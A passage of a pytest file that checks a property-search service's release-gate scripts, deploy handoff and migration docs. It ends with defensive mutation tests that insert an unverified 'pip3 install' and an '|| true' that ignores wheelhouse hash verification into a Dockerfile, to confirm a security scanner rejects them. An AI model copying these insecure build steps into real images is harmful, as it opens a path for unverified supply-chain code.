    assert "propertyquarry_postgres_dr.py" not in deploy
    assert "PROPERTYQUARRY_DR_BACKUP_RECEIPT" not in deploy

def test_property_release_gate_runs_cached_evidence_overlay_contracts() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert (
        "authenticated eight-table Teable to atomic Postgres evidence-overlay receipt, cached "
        "unavailable/stale/verified states, and no inline source indexing"
    ) in release_gate
    assert "tests/test_property_evidence_overlays.py" in release_gate


def test_property_release_gate_wires_tour_import_manifest_into_gold_status() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "scripts/materialize_property_tour_export_manifest.py" in release_gate
    assert "tour_export_incoming_dir=" in release_gate
    assert "property_api_container=\"${PROPERTYQUARRY_API_CONTAINER_NAME:-propertyquarry-api}\"" in release_gate
    assert "docker exec \"${property_api_container}\" python /app/scripts/verify_property_tour_controls.py" in release_gate
    assert "--tour-root /data/public_property_tours" in release_gate
    assert "property-tour-controls-release-gate-live-container.json" in release_gate
    assert "docker cp \"${property_api_container}:/data/artifacts/property-tour-controls-release-gate-live-container.json\"" in release_gate
    assert "docker exec \"${property_api_container}\" python /app/scripts/discover_property_tour_exports.py" in release_gate
    assert "--drop-dir /data/incoming_property_tours" in release_gate
    assert "--public-tour-dir /data/public_property_tours" in release_gate
    assert "property-tour-export-discovery-release-gate-live-container.json" in release_gate
    assert "docker exec --user root \"${property_api_container}\" python /app/scripts/materialize_property_tour_export_manifest.py" in release_gate
    assert "--incoming-root /data/incoming_property_tours" in release_gate
    assert "property-tour-export-import-manifest-release-gate-live-container.json" in release_gate
    assert "property_render_container=\"${PROPERTYQUARRY_RENDER_CONTAINER_NAME:-propertyquarry-render-tools}\"" in release_gate
    assert "scripts/verify_property_tour_vendor_tooling.py" in release_gate
    assert '--runtime-container "${property_api_container}"' in release_gate
    assert 'runtime_reconstruction_container="${PROPERTYQUARRY_RUNTIME_RECONSTRUCTION_CONTAINER:-${property_render_container}}"' in release_gate
    assert 'runtime_reconstruction_container="${PROPERTYQUARRY_RUNTIME_RECONSTRUCTION_CONTAINER:-${property_api_container}}"' not in release_gate
    assert "--runtime-only" in release_gate
    assert "_completion/tours/property-tour-vendor-tooling-current.json" in release_gate
    assert "--drop-dir \"${tour_export_incoming_dir}\"" in release_gate
    assert "--public-tour-dir \"${EA_PUBLIC_TOUR_DIR:-${EA_ROOT}/state/public_property_tours}\"" in release_gate
    assert "--tour-root \"${EA_PUBLIC_TOUR_DIR:-${EA_ROOT}/state/public_property_tours}\"" in release_gate
    assert "--incoming-root \"${tour_export_incoming_dir}\"" in release_gate
    assert "_completion/property_tour_exports/release-gate-import-manifest.json" in release_gate
    assert "--import-manifest-receipt _completion/property_tour_exports/release-gate-import-manifest.json" in release_gate
    assert "--vendor-tooling-receipt _completion/tours/property-tour-vendor-tooling-current.json" in release_gate
    assert "_completion/provider_smoke/production-e2e-provider-matrix-current.json" in release_gate


def test_property_deploy_wrapper_uses_durable_api_artifact_path_for_import_manifest() -> None:
    deploy_script = _read("scripts/deploy_propertyquarry.sh")

    _assert_external_deploy_controller_handoff(deploy_script)
    assert "--canonical-compose-plan" in deploy_script
    assert "docker exec" not in deploy_script
    assert "docker cp" not in deploy_script


def test_property_deploy_wrapper_refreshes_release_hygiene_before_gold_status() -> None:
    deploy_script = _read("scripts/deploy_propertyquarry.sh")

    _assert_external_deploy_controller_handoff(deploy_script)
    assert "--forbid-candidate-output-authority" in deploy_script
    assert "check_property_release_hygiene.py" not in deploy_script
    assert "propertyquarry_gold_status.py" not in deploy_script


def test_property_deploy_wrapper_rebuilds_and_recreates_render_tools_runtime() -> None:
    deploy_script = _read("scripts/deploy_propertyquarry.sh")

    _assert_external_deploy_controller_handoff(deploy_script)
    assert "--canonical-compose-plan" in deploy_script
    assert '"${DC[@]}"' not in deploy_script


def test_property_release_gate_mentions_live_mobile_surface_smoke() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "required live mobile surface smoke" in release_gate
    assert "scripts/propertyquarry_live_mobile_surface_smoke.py" in release_gate
    assert "PROPERTYQUARRY_LIVE_MOBILE_BASE_URL" in release_gate
    assert "PROPERTYQUARRY_LIVE_SMOKE_BASE_URL" in release_gate


def test_property_gold_refresh_checks_omagic_adapter_in_api_runtime() -> None:
    refresh_script = _read("scripts/refresh_propertyquarry_current_gold_receipts.sh")

    assert "Vendor-tooling receipt from host with API runtime adapter proof" in refresh_script
    assert '--runtime-container "${API_CONTAINER}"' in refresh_script
    assert "--runtime-container ''" not in refresh_script
    assert "Vendor-tooling receipt from render container" not in refresh_script


def test_property_deploy_requires_existing_mobile_research_detail_without_seeding() -> None:
    deploy_script = _read("scripts/deploy_propertyquarry.sh")

    _assert_external_deploy_controller_handoff(deploy_script)
    assert "--signed-request-fd" in deploy_script
    assert "seed-research-detail-fixture" not in deploy_script


def test_property_deploy_refreshes_scene_video_receipts_before_gold_status() -> None:
    deploy_script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(deploy_script)
    assert "--forbid-candidate-output-authority" in deploy_script
    assert "scene_video_readiness" not in deploy_script


def test_property_release_gate_wires_scene_video_refresh_packet_verifier_into_gold_status() -> None:
    release_gate = _read("scripts/property_release_gates.sh")
    live_release_gate = _read("scripts/propertyquarry_live_release_gates.sh")

    for required in (
        'scene_video_shared_env_file="${PROPERTYQUARRY_SCENE_VIDEO_SHARED_ENV_FILE:-state/runtime/property_scene_video_shared.env}"',
        'scene_video_shared_env_runtime_file="${PROPERTYQUARRY_SCENE_VIDEO_SHARED_ENV_RUNTIME_FILE:-/home/ea/property_scene_video_shared.env}"',
        "copy_scene_video_shared_env_to_container",
        "docker_exec_scene_video_python",
        "scripts/property_scene_video_shared_env.py",
        "scripts/verify_property_scene_video_readiness.py",
        "--output /data/artifacts/property-scene-video-readiness-release-gate-verifier-live-container.json",
        "--load-shared-env",
        "--output _completion/scene_video_readiness/release-gate-verifier.json",
        "scripts/property_scene_video_runtime_status.py",
        "--output /data/artifacts/property-scene-video-runtime-status-release-gate-live-container.json",
        "--output _completion/scene_video_readiness/runtime-status.json",
        "scripts/materialize_scene_video_provider_refresh_packet.py",
        "scripts/verify_scene_video_provider_refresh_packet.py",
        "scripts/propertyquarry_notify_scene_video_provider_refresh.py",
        "_completion/scene_video_readiness/runtime-status.json",
        "--scene-video-runtime-status-receipt _completion/scene_video_readiness/runtime-status.json",
        "_completion/scene_video_readiness/provider-refresh-packet.json",
        "_completion/scene_video_readiness/provider-refresh-packet-verifier.json",
        "_completion/scene_video_readiness/provider-refresh-telegram-report.json",
        "--scene-video-provider-refresh-packet _completion/scene_video_readiness/provider-refresh-packet.json",
        "--scene-video-provider-refresh-packet-verifier-receipt _completion/scene_video_readiness/provider-refresh-packet-verifier.json",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_ENABLED",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_PRINCIPAL_ID",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_BASE_URL",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_STATE",
        "PROPERTYQUARRY_NOTIFICATION_PREFER_CONTAINER_RUNTIME",
    ):
        assert required in release_gate

    assert release_gate.index('scene_video_refresh_notification_report="_completion/scene_video_readiness/provider-refresh-telegram-report.json"') < release_gate.index('PYTHONPATH=ea "${PYTHON_BIN}" scripts/propertyquarry_gold_status.py')
    assert "> /data/artifacts/property-scene-video-readiness-release-gate-verifier-live-container.json" not in release_gate
    assert "PROPERTYQUARRY_LIVE_RESEARCH_DETAIL_ROUTE" in live_release_gate
    assert "EA_API_TOKEN" in live_release_gate
    assert "--require-research-detail" in live_release_gate
    assert "PROPERTYQUARRY_LIVE_RESEARCH_DETAIL_SEED_FIXTURE" not in live_release_gate
    assert "--seed-research-detail-fixture" not in live_release_gate
    assert "PROPERTYQUARRY_LIVE_MOBILE_TIMEOUT_MS" in _read("scripts/propertyquarry_live_mobile_surface_smoke.py")
    assert "_completion/smoke/property-live-mobile-release-gate.json" in release_gate
    assert "--live-mobile-receipt _completion/smoke/property-live-mobile-release-gate.json" in release_gate
    assert "scripts/propertyquarry_live_public_smoke.py" in live_release_gate
    assert "scripts/propertyquarry_live_authenticated_smoke.py" in live_release_gate
    assert '--expected-plan-label "${PROPERTYQUARRY_LIVE_SMOKE_PLAN_LABEL:-Free}"' in live_release_gate
    assert "_completion/smoke/property-live-public-release-gate.json" in release_gate
    assert "_completion/smoke/property-live-authenticated-release-gate.json" in release_gate
    assert "--public-smoke-receipt _completion/smoke/property-live-public-release-gate.json" in release_gate
    assert "--authenticated-smoke-receipt _completion/smoke/property-live-authenticated-release-gate.json" in release_gate
    assert "scripts/verify_property_tour_provider_ownership.py" in release_gate
    assert "_completion/property_tour_ownership/release-gate.json" in release_gate
    assert "--tour-provider-ownership-receipt _completion/property_tour_ownership/release-gate.json" in release_gate
    assert "PROPERTYQUARRY_GOLD_NOTIFICATION_ENABLED" in release_gate
    assert "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_ENABLED" in release_gate
    assert "tests/test_property_live_mobile_surface_smoke.py" in release_gate
    assert "tests/test_property_live_http_security.py" in release_gate
    assert "tests/test_property_live_presentation_security.py" in release_gate
    assert "tests/test_property_live_release_provenance.py" in release_gate
    assert "tests/test_propertyquarry_live_telegram_delivery.py" in release_gate
    assert "tests/test_property_public_tour_provider_retirement.py" in release_gate


def test_property_gold_refresh_wires_scene_video_runtime_status_into_gold_status() -> None:
    refresh_script = _read("scripts/refresh_propertyquarry_current_gold_receipts.sh")

    for required in (
        'scene_video_shared_env_file="${PROPERTYQUARRY_SCENE_VIDEO_SHARED_ENV_FILE:-state/runtime/property_scene_video_shared.env}"',
        'scene_video_shared_env_runtime_file="${PROPERTYQUARRY_SCENE_VIDEO_SHARED_ENV_RUNTIME_FILE:-/home/ea/property_scene_video_shared.env}"',
        "copy_scene_video_shared_env_to_container",
        "docker_exec_scene_video_python",
        "refresh_scene_video_receipts",
        "scripts/property_scene_video_shared_env.py",
        "scripts/property_scene_video_runtime_status.py",
        "property-scene-video-runtime-status-current.json",
        "_completion/scene_video_readiness/runtime-status.json",
        "--scene-video-runtime-status-receipt",
    ):
        assert required in refresh_script


def test_property_gold_refresh_can_send_scene_video_provider_refresh_notification() -> None:
    refresh_script = _read("scripts/refresh_propertyquarry_current_gold_receipts.sh")

    for required in (
        "scripts/propertyquarry_notify_scene_video_provider_refresh.py",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_ENABLED",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_PRINCIPAL_ID",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_BASE_URL",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_STATE",
        "PROPERTYQUARRY_NOTIFICATION_PREFER_CONTAINER_RUNTIME",
        "_completion/scene_video_readiness/provider-refresh-telegram-report.json",
        '--packet "${scene_video_refresh_packet}"',
        '--verifier "${scene_video_refresh_packet_verifier}"',
        '--runtime-status "${scene_video_runtime_status_receipt}"',
        'printf \'{"status":"skipped","reason":"PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_ENABLED_not_set"}\\n\' > "${scene_video_refresh_notification_report}"',
        "Scene-video provider refresh notification failed",
    ):
        assert required in refresh_script

    assert refresh_script.index('scene_video_refresh_notification_report="_completion/scene_video_readiness/provider-refresh-telegram-report.json"') < refresh_script.index('log_step "Gold-status receipt"')


def test_property_gold_refresh_catalog_probe_is_read_only() -> None:
    refresh_script = _read("scripts/refresh_propertyquarry_current_gold_receipts.sh")
    catalog_step = refresh_script.index('"Provider catalog smoke receipt"')
    matrix_step = refresh_script.index('"Provider E2E matrix receipt"')

    assert catalog_step < refresh_script.index("--no-execute-search-matrix", catalog_step) < matrix_step
    assert catalog_step < refresh_script.index("--no-cross-country-sanitization", catalog_step) < matrix_step
    assert matrix_step < refresh_script.index("--execute-search-matrix", matrix_step)


def test_property_release_gate_runs_generated_reconstruction_glb_smoke() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "scripts/ensure_propertyquarry_render_bridge_runtime.py" in release_gate
    assert "live generated-reconstruction GLB export smoke" in release_gate
    assert "service-owned generated-reconstruction smoke" in release_gate
    assert "scripts/property_runtime_reconstruction_smoke.py" in release_gate
    assert "scripts/property_service_generated_reconstruction_smoke.py" in release_gate
    assert "PROPERTYQUARRY_RUNTIME_RECONSTRUCTION_CONTAINER" in release_gate
    assert "PROPERTYQUARRY_RUNTIME_RECONSTRUCTION_SMOKE_SLUG" in release_gate
    assert "PROPERTYQUARRY_RUNTIME_RECONSTRUCTION_BASE_URL" in release_gate
    assert "PROPERTYQUARRY_SERVICE_GENERATED_RECONSTRUCTION_SMOKE_SLUG" in release_gate
    assert "PROPERTYQUARRY_SERVICE_GENERATED_RECONSTRUCTION_BASE_URL" in release_gate
    assert "PROPERTYQUARRY_LIVE_HOST_HEADER" in release_gate
    assert "--require-public-contract" in release_gate
    assert "scripts/property_service_generated_reconstruction_smoke.py" in release_gate
    assert '--host-header "${PROPERTYQUARRY_LIVE_HOST_HEADER:-propertyquarry.com}"' in release_gate
    assert "--require-browser-shell" in release_gate
    assert "--require-browser-shell" in release_gate
    assert '--host-header "${PROPERTYQUARRY_LIVE_HOST_HEADER:-propertyquarry.com}"' in release_gate
    assert "--require-glb" in release_gate
    assert "_completion/tours/property-render-bridge-runtime-release-gate.json" in release_gate
    assert "_completion/tours/property-runtime-reconstruction-release-gate.json" in release_gate
    assert "_completion/tours/property-service-generated-reconstruction-release-gate.json" in release_gate
    assert "--runtime-reconstruction-receipt _completion/tours/property-runtime-reconstruction-release-gate.json" in release_gate
    assert "--service-generated-reconstruction-receipt _completion/tours/property-service-generated-reconstruction-release-gate.json" in release_gate
    assert "--fail-on-error" in release_gate


def test_property_gold_refresh_runs_generated_reconstruction_browser_shell_smoke() -> None:
    refresh_script = _read("scripts/refresh_propertyquarry_current_gold_receipts.sh")

    assert "scripts/ensure_propertyquarry_render_bridge_runtime.py" in refresh_script
    assert "scripts/property_runtime_reconstruction_smoke.py" in refresh_script
    assert "scripts/property_service_generated_reconstruction_smoke.py" in refresh_script
    assert "--public-base-url \"${BASE_URL}\"" in refresh_script
    assert '--host-header "${HOST_HEADER}"' in refresh_script
    assert "--require-public-contract" in refresh_script
    assert "--require-browser-shell" in refresh_script
    assert "--require-browser-shell" in refresh_script
    assert "--require-glb" in refresh_script
    assert "_completion/tours/property-render-bridge-runtime-current.json" in refresh_script
    assert "_completion/tours/property-runtime-reconstruction-release-gate.json" in refresh_script
    assert "PROPERTYQUARRY_SERVICE_GENERATED_RECONSTRUCTION_SMOKE_SLUG" in refresh_script
    assert "_completion/tours/property-service-generated-reconstruction-current.json" in refresh_script
    assert "--service-generated-reconstruction-receipt" in refresh_script
    assert '--runtime-container "${API_CONTAINER}"' in refresh_script


def test_property_gold_refresh_runs_walkthrough_quality_on_host_toolchain() -> None:
    refresh_script = _read("scripts/refresh_propertyquarry_current_gold_receipts.sh")

    provider_index = refresh_script.index(
        "scripts/propertyquarry_walkthrough_provider_proof_gate.py"
    )
    quality_index = refresh_script.index(
        "scripts/propertyquarry_walkthrough_quality_gate.py"
    )
    stale_receipt_clear_index = refresh_script.index(
        'rm -f "${walkthrough_provider_proof_receipt}" "${walkthrough_quality_receipt}"'
    )
    assert stale_receipt_clear_index < provider_index
    assert provider_index < quality_index
    assert "PROPERTYQUARRY_WALKTHROUGH_PROVIDER_PROOF_TIMEOUT_SECONDS" in refresh_script
    assert "PROPERTYQUARRY_WALKTHROUGH_QUALITY_PROCESS_TIMEOUT_SECONDS" in refresh_script
    assert "PROPERTYQUARRY_WALKTHROUGH_QUALITY_FFPROBE_TIMEOUT_SECONDS" in refresh_script
    assert "PROPERTYQUARRY_WALKTHROUGH_QUALITY_FRAME_SAMPLE_TIMEOUT_SECONDS" in refresh_script
    assert refresh_script.count('--tour-root "${walkthrough_tour_root}"') == 2
    assert '--provider-proof-receipt "${walkthrough_provider_proof_receipt}"' in refresh_script
    assert '"--walkthrough-provider-proof-receipt" "${walkthrough_provider_proof_receipt}"' in refresh_script
    assert "python /app/scripts/propertyquarry_walkthrough_quality_gate.py" not in refresh_script


def test_property_release_gate_binds_quality_to_provider_proof_on_one_tour_root() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    provider_index = release_gate.index(
        "scripts/propertyquarry_walkthrough_provider_proof_gate.py"
    )
    quality_index = release_gate.index(
        "scripts/propertyquarry_walkthrough_quality_gate.py"
    )
    assert provider_index < quality_index
    assert release_gate.count('--tour-root "${walkthrough_provider_proof_tour_root}"') == 2
    assert (
        "--provider-proof-receipt _completion/smoke/"
        "property-live-walkthrough-provider-proof-release-gate.json"
    ) in release_gate


def test_property_release_gate_invokes_launch_gold_with_full_explicit_receipts() -> None:
    release_gate = _read("scripts/property_release_gates.sh")
    gold_call = release_gate.split(
        'PYTHONPATH=ea "${PYTHON_BIN}" scripts/propertyquarry_gold_status.py \\\n',
        1,
    )[1].split("  --fail-on-blocked", 1)[0]

    for required_flag in (
        "--profile launch",
        "--performance-receipt",
        "--continuous-ux-receipt",
        "--live-mobile-receipt",
        "--accessibility-receipt",
        "--failure-state-receipt",
        "--activation-to-value-receipt",
        "--public-smoke-receipt",
        "--authenticated-smoke-receipt",
        "--billing-receipt",
        "--whole-project-scope-receipt",
        "--security-posture-receipt",
        "--release-hygiene-receipt",
        "--id-austria-receipt",
        "--provider-catalog-receipt",
        "--provider-matrix-receipt",
        "--slo-metrics-snapshot",
        "--slo-metrics-probe",
        "--monitoring-runtime-receipt",
        "--prometheus-range-receipt",
        "--prometheus-range-response",
        "--alert-delivery-receipt",
        "--require-launch-evidence",
        "--expected-release-sha",
        "--expected-image-digest",
        "--expected-teable-origin",
        "--expected-teable-base-id-sha256",
        "--expected-evidence-overlay-phase",
    ):
        assert required_flag in gold_call
    for required_env in (
        "PROPERTYQUARRY_CONTINUOUS_UX_RECEIPT",
        "PROPERTYQUARRY_FAILURE_STATE_RECEIPT",
        "PROPERTYQUARRY_ACTIVATION_TO_VALUE_RECEIPT",
        "PROPERTYQUARRY_PROVIDER_CATALOG_RECEIPT",
    ):
        assert required_env in release_gate
    assert (
        'expected_public_origin="${PROPERTYQUARRY_PUBLIC_ORIGIN:-'
        '${PROPERTYQUARRY_EXPECTED_RELEASE_PUBLIC_ORIGIN:-}}"'
    ) in release_gate
    assert "PROPERTYQUARRY_EXPECTED_TEABLE_ORIGIN" in release_gate
    assert "PROPERTYQUARRY_EXPECTED_TEABLE_BASE_ID_SHA256" in release_gate
    gold_index = release_gate.index("scripts/propertyquarry_gold_status.py")
    for receipt_writer in (
        "property-security-posture-release-gate.json",
        "property-release-hygiene-release-gate.json",
        "property-whole-project-scope-release-gate.json",
    ):
        assert release_gate.index(receipt_writer) < gold_index


def test_property_deploy_refreshes_service_generated_reconstruction_before_gold_status() -> None:
    deploy_script = _read("scripts/deploy_propertyquarry.sh")

    _assert_external_deploy_controller_handoff(deploy_script)
    assert "--forbid-candidate-output-authority" in deploy_script
    assert "property_service_generated_reconstruction_smoke.py" not in deploy_script


def test_property_release_gate_sends_gold_notification_when_green() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "scripts/propertyquarry_notify_gold_status.py" in release_gate
    assert "PROPERTYQUARRY_GOLD_NOTIFICATION_PRINCIPAL_ID" in release_gate
    assert "PROPERTYQUARRY_GOLD_NOTIFICATION_BASE_URL" in release_gate
    assert "PROPERTYQUARRY_GOLD_NOTIFICATION_STATE" in release_gate
    assert "PROPERTYQUARRY_NOTIFICATION_PREFER_CONTAINER_RUNTIME" in release_gate
    assert "_completion/property_gold_status/telegram-notify-report.json" in release_gate
    assert "warning: PropertyQuarry gold notification script failed." in release_gate


def test_readme_separates_disposable_compose_from_production_handoff() -> None:
    readme = " ".join(_read("README.md").split())

    assert "make deploy" in readme
    assert "scripts/deploy_propertyquarry.sh" in readme
    assert "## Disposable local development" in readme
    assert (
        "EA_RUNTIME_MODE=dev docker compose -f docker-compose.property.yml up -d --build"
        in readme
    )
    assert "## Production release handoff" in readme
    assert "PROPERTYQUARRY_DEPLOY_SIGNED_REQUEST" in readme
    assert "propertyquarry-deploy-preflight-request.json" in readme
    assert "./scripts/deploy_propertyquarry.sh --preflight-only" in readme
    assert "A preflight request is operation-bound and non-authorizing" in readme
    assert "propertyquarry-deploy-run-request.json" in readme
    assert "independently installed release controller" in readme
    assert "The caller must remain unprivileged, have no Docker daemon authority" in readme
    assert "docs/PROPERTYQUARRY_RELEASE_CONTROL_PROTOCOL_V1.md" in readme
    assert "make propertyquarry-release-protocol-contracts" in readme
    assert "does not verify signatures, establish trust, authorize an operation" in readme
    assert "There is no local Compose fallback." in readme
    assert "POSTGRES_PASSWORD" in readme
    assert "EA_SIGNING_SECRET" in readme
    assert "EA_API_TOKEN or local access settings" in readme
    assert "PROPERTYQUARRY_RUNTIME_GATES=1" in readme
    assert "PROPERTYQUARRY_LIVE_SMOKE_BASE_URL=http://localhost:8097" in readme
    assert "EA_HOST_PORT=8097 make deploy" not in readme
    assert "PROPERTYQUARRY_COMPOSE_PROJECT_NAME=propertyquarry-next" not in readme
    assert "PROPERTYQUARRY_API_CONTAINER_NAME=propertyquarry-api-next" not in readme
    assert "PROPERTYQUARRY_DEPLOY_PROVIDER_E2E=1" not in readme


def test_schema_migration_docs_reserve_production_for_signed_controller() -> None:
    migration_docs = _read("docs/PROPERTYQUARRY_SCHEMA_MIGRATIONS.md")
    production = " ".join(
        migration_docs.split("## Production deploy phase\n", 1)[1]
        .split("## Disposable development and test targets\n", 1)[0]
        .split()
    )
    disposable = " ".join(
        migration_docs.split("## Disposable development and test targets\n", 1)[1]
        .split("## Runtime readiness\n", 1)[0]
        .split()
    )

    assert "candidate checkout has no production migration authority" in production
    assert "PROPERTYQUARRY_DEPLOY_SIGNED_REQUEST" in production
    assert "propertyquarry-deploy-preflight-request.json" in production
    assert "./scripts/deploy_propertyquarry.sh --preflight-only" in production
    assert "preflight request is operation-bound and cannot authorize mutation" in production
    assert "distinct, fresh `deploy-run` signed request" in production
    assert (
        "Direct Compose and Python migration commands are not a production fallback"
        in production
    )
    assert "docker compose" not in production
    assert "migrate_property_search_storage.py" not in production
    assert "disposable local development database" in disposable
    assert "EA_RUNTIME_MODE=dev" in disposable
    assert "docker compose -f docker-compose.property.yml up -d --build" in disposable
    assert "python3 -m app.product.propertyquarry_schema migrate" in disposable
    assert "run the candidate release's deploy migration" not in migration_docs


def test_schema_v11_docs_require_contained_homogeneous_cutover() -> None:
    migration_docs = _read("docs/PROPERTYQUARRY_SCHEMA_MIGRATIONS.md")
    cutover = " ".join(
        migration_docs.split(
            "### Mandatory contained cutover for schema v11\n", 1
        )[1]
        .split("## Disposable development and test targets\n", 1)[0]
        .split()
    )

    for required in (
        "Writer contract 3 and schema v11 are deliberately not rolling-compatible",
        "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET",
        "property_search_erasure_key_mismatch",
        "stop every API, worker, scheduler, and render/publication writer",
        "From live schema v9 this applies v10 and v11 in the same migration transaction",
        "homogeneous schema-v11/contract-3 fleet",
        "fresh per-instance heartbeats for the complete expected role manifest",
        "never restart a contract-2 binary after v11",
        "Changing the erasure secret is a separately designed key migration",
    ):
        assert required in cutover

    env_example = _read(".env.example")
    assert "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET=" in env_example
    assert "Do not rotate it without a governed database key migration" in env_example


def test_packet_index_docs_hold_ingress_through_new_image_activation() -> None:
    migration_docs = _read("docs/PROPERTYQUARRY_SCHEMA_MIGRATIONS.md")
    activation = " ".join(
        migration_docs.split("### Legacy research-packet index activation\n", 1)[1]
        .split("## Disposable development and test targets\n", 1)[0]
        .split()
    )

    for required in (
        "research-packet index remains held",
        "new immutable web image",
        "coordinated writer fleet",
        "complete `api`, `worker`, and `scheduler` instance manifest",
        "/app/scripts/check_property_search_storage_schema.py",
        "--phase pre-backfill",
        "property_search_work_queue",
        "delivery_outbox",
        "/app/scripts/backfill_property_research_packet_links.py",
        "--apply --batch-size 25 --max-batches 0 --max-batch-bytes 33554432",
        "status=complete",
        "coverage_complete=true",
        "fleet-proof SHA-256 equal to the pre-backfill proof",
        "--phase activate",
        "status=activation_ready",
        "reopen ingress",
        "Direct invocation from the checkout remains forbidden for production",
    ):
        assert required in activation


def test_environment_matrix_separates_local_compose_from_production_handoff() -> None:
    matrix = _read("ENVIRONMENT_MATRIX.md")

    assert "docker-compose.property.yml` directly only for a disposable local development target" in matrix
    assert "EA_RUNTIME_MODE=dev" in matrix
    assert "`make deploy` invokes the unprivileged production handoff" in matrix
    assert "operation-bound signed request" in matrix
    assert "independently installed release controller" in matrix
    assert "Use `docker-compose.property.yml` or `make deploy`" not in matrix


def test_release_checklist_requires_distinct_preflight_and_deploy_requests() -> None:
    checklist = _read("RELEASE_CHECKLIST.md")

    assert "propertyquarry-deploy-preflight-request.json" in checklist
    assert "It must bind `deploy-preflight`, cannot authorize mutation" in checklist
    assert "never reused for deployment" in checklist
    assert "distinct fresh `deploy-run` request" in checklist
    assert "propertyquarry-deploy-run-request.json" in checklist


def test_runtime_hard_exit_gates_can_extend_into_propertyquarry_live_runtime() -> None:
    script = _read("scripts/runtime_hard_exit_gates.sh")
    smoke_help = _read("scripts/smoke_help.sh")

    for required in (
        "PROPERTYQUARRY_RUNTIME_GATES=1",
        "PROPERTYQUARRY_LIVE_SMOKE_BASE_URL",
        "PROPERTYQUARRY_LIVE_PROVIDER_SMOKE_PRINCIPAL_ID",
        "scripts/propertyquarry_live_public_smoke.py",
        "scripts/propertyquarry_live_authenticated_smoke.py",
        "scripts/property_live_provider_smoke.py",
        "PROPERTYQUARRY_LIVE_PROVIDER_SMOKE=1",
        "PROPERTYQUARRY_LIVE_PROVIDER_SMOKE_DRY_RUN=0",
        "verify_pocket_audio_archive.py failed, continuing because Pocket archive backfill is outside the PropertyQuarry runtime lane",
        "EA_API_TOKEN is not set; skipping authenticated/mobile/provider PropertyQuarry runtime smokes",
    ):
        assert required in script

    for required in (
        "scripts/deploy_propertyquarry.sh",
        "scripts/propertyquarry_live_public_smoke.py",
        "scripts/propertyquarry_live_authenticated_smoke.py",
        "scripts/property_live_provider_smoke.py",
    ):
        assert required in smoke_help


def test_property_security_posture_accepts_pinned_multistage_scratch_runtimes() -> None:
    for path in ("ea/Dockerfile.property", "ea/Dockerfile.property-web"):
        dockerfile = _read(path)
        base_images = property_security_posture._dockerfile_base_images(dockerfile)

        assert len(base_images) >= 2
        assert base_images[-1] == "scratch"
        assert property_security_posture._unpinned_dockerfile_base_images(dockerfile) == []
        assert property_security_posture._dockerfile_final_user(dockerfile) == "10001:10001"

    receipt = property_security_posture.build_security_posture_receipt()
    assert receipt["status"] == "pass"
    assert receipt["failures"] == []


@pytest.mark.parametrize(
    "marker",
    (
        (
            "COPY --chmod=0555 scripts/verify_propertyquarry_python_wheelhouse.py "
            "/usr/local/libexec/verify_propertyquarry_python_wheelhouse.py\n"
        ),
        "RUN python /usr/local/libexec/verify_propertyquarry_python_wheelhouse.py \\\n",
        "        --requirements-lock /app/requirements.lock \\\n",
        "        --hash-lock /app/requirements.wheelhouse.lock \\\n",
        "        --wheelhouse /opt/propertyquarry-python-wheels && \\\n",
        "        --no-index \\\n",
        "        --require-hashes \\\n",
        "        --requirement /app/requirements.wheelhouse.lock && \\\n",
        "    rm -rf /opt/propertyquarry-python-wheels && \\\n",
        "    rm -f /usr/local/libexec/verify_propertyquarry_python_wheelhouse.py\n",
    ),
)
def test_property_security_posture_requires_verified_hash_locked_web_wheelhouse(
    monkeypatch: pytest.MonkeyPatch,
    marker: str,
) -> None:
    def remove_wheelhouse_contract_marker(dockerfile: str) -> str:
        assert dockerfile.count(marker) == 1
        return dockerfile.replace(marker, "", 1)

    failures = _security_posture_failures_with_file_mutation(
        monkeypatch,
        path="ea/Dockerfile.property-web",
        mutate=remove_wheelhouse_contract_marker,
    )

    assert failures == [
        "ea/Dockerfile.property-web must verify requirements.lock and install "
        "from the hash-locked offline wheelhouse"
    ]


def test_property_security_posture_rejects_ignored_web_wheelhouse_verification(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def ignore_wheelhouse_verification_failure(dockerfile: str) -> str:
        marker = "        --wheelhouse /opt/propertyquarry-python-wheels && \\\n"
        assert dockerfile.count(marker) == 1
        return dockerfile.replace(
            marker,
            "        --wheelhouse /opt/propertyquarry-python-wheels || true; \\\n",
            1,
        )

    failures = _security_posture_failures_with_file_mutation(
        monkeypatch,
        path="ea/Dockerfile.property-web",
        mutate=ignore_wheelhouse_verification_failure,
    )

    assert failures == [
        "ea/Dockerfile.property-web must verify requirements.lock and install "
        "from the hash-locked offline wheelhouse"
    ]


def test_property_security_posture_rejects_second_web_dependency_install(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def append_network_dependency_install(dockerfile: str) -> str:
        marker = "\nRUN mkdir -p /app/scripts"
        assert dockerfile.count(marker) == 1
        return dockerfile.replace(
            marker,
            "\nRUN pip3 install unverified-package" + marker,
            1,
        )

    failures = _security_posture_failures_with_file_mutation(
        monkeypatch,
        path="ea/Dockerfile.property-web",
        mutate=append_network_dependency_install,
    )

    assert failures == [
        "ea/Dockerfile.property-web must verify requirements.lock and install "
        "from the hash-locked offline wheelhouse"
    ]


